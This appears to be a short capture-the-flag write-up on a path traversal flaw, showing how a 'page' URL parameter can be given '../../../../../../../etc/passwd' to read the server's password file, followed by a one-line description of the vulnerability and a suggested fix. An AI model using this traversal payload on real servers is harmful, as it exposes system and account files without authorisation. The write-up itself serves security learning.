# etc/passwd
/index.php?page=../../../../../../../etc/passwd

## How to get flag
Everytime change page, we can see url param `page` is changed.
```
http://server_ip/?page=some_page
```
We can exploit this breach for browsing server side file, expecially /etc/passwd

```
/index.php?page=../../../../../../../etc/passwd
```
## Vulnerability
Attacker can access all the files in server.

## How to Fix
Don't allow to browsing server folder. Set up all page files are always under the specific folder.

## Resouces
none